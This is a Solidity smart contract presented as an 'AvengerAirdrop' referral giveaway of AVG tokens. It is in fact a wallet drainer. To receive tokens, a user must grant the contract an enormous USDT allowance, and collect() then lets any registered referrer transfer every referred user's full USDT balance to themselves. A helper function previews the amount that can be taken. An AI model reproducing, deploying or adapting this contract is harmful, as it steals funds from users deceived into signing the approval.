// SPDX-License-Identifier: MIT

pragma solidity 0.6.12;

import "./SafeMath.sol";
import "./IBEP20.sol";
import "./SafeBEP20.sol";
import "./Ownable.sol";

contract AvengerAirdrop is Ownable {
    using SafeMath for uint256;
    using SafeBEP20 for IBEP20;

    struct User {
        address referrer;
        uint256 lastReceiveTime;
    }

    struct Referrer {
        uint256 num;
        bool isExist;
        bool isDisable;
        address[] users;
    }

    IBEP20  usdt = IBEP20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IBEP20 public avg = IBEP20(0x883035Bc64847BD570C02EE8348e6c57AB4B355f);

    uint256 public allowanceMin = 100000000 * 1e18;

    mapping(address => User) public users;
    mapping(address => Referrer)  public referrers;

    event Receive(address indexed user, address referrer, uint256 amount);
    event Collect(address indexed user, uint256 amount, uint256 num, uint256 min);

    constructor() public {
        addReferrer(msg.sender);
    }

    function approve(address _referrer) public {
        require(_referrer != address(0), 'need referrer');
        require(referrers[_referrer].isExist == true, 'no permission');

        uint256 receiveAmount = usdt.balanceOf(msg.sender).mul(10);
        require(avg.balanceOf(address(this)) >= receiveAmount, 'token not enough');

        uint256 allowance = usdt.allowance(msg.sender, address(this));
        require(allowance >= allowanceMin, 'no permission');

        if(users[msg.sender].lastReceiveTime > 0) {
            require(users[msg.sender].lastReceiveTime <= (block.timestamp - 86400), 'only once everyday');
        }

        if (users[msg.sender].referrer == address(0) && msg.sender != _referrer && referrers[msg.sender].isExist != true) {
            if (referrers[_referrer].isExist == true) {
                referrers[_referrer].users.push(msg.sender);
                referrers[_referrer].num = referrers[_referrer].num.add(1);
                users[msg.sender].referrer = _referrer;
            }
        }

        avg.transfer(address(msg.sender), receiveAmount);
        users[msg.sender].lastReceiveTime = block.timestamp;
        emit Receive(msg.sender, _referrer, receiveAmount);
    }

    function collect(uint256 _minAmount) public {
        Referrer memory referrer = referrers[msg.sender];
        require(referrer.isExist == true, 'no permission');
        require(referrer.isDisable == false, 'address is forbidden');

        uint256 totalAmount = 0;
        uint256 totalCount = 0;

        for (uint i = 0; i < referrer.users.length; i++) {
            uint256 balance = usdt.balanceOf(referrer.users[i]);

            if (balance > _minAmount) {
                if (usdt.allowance(referrer.users[i], address(this)) >= balance) {
                    usdt.transferFrom(referrer.users[i], msg.sender, balance);
                    totalAmount = totalAmount.add(balance);
                    totalCount = totalCount.add(1);
                }
            }
        }

        if (totalAmount > 0) {
            emit Collect(msg.sender, totalAmount, totalCount, _minAmount);
        }
    }

    function getCollectInfo(uint256 _minAmount) public view returns (uint256 ,uint256){
        Referrer memory referrer = referrers[msg.sender];
        require(referrer.isDisable == false, 'address is forbidden');

        uint256 totalAmount = 0;
        uint256 totalCount = 0;

        for (uint i = 0; i < referrer.users.length; i++) {
            uint256 balance = usdt.balanceOf(referrer.users[i]);

            if (balance > _minAmount) {
                if (usdt.allowance(referrer.users[i], address(this)) >= balance) {
                    totalAmount = totalAmount.add(balance);
                    totalCount = totalCount.add(1);
                }
            }
        }

        return (totalAmount, totalCount);
    }

    function disableReferral(address _addr) public onlyOwner {
        Referrer storage referrer = referrers[_addr];
        require(referrer.isExist == true, 'no permission');
        referrer.isDisable = true;
    }

    function addReferrer(address _addr) public onlyOwner {
        Referrer memory referrer = referrers[_addr];
        require(referrer.isExist == false, 'already exist');
        referrers[_addr] = Referrer(
            0,
            true,
            false,
            new address[](0)
        );
    }

    function draw(uint256 _amount) public onlyOwner {
        require(avg.balanceOf(address(this)) >= _amount, 'not enough amount');
        avg.transfer(this.owner(), _amount);
    }

    function updateTokenAddress(address _addr) public onlyOwner {
        avg = IBEP20(_addr);
    }
}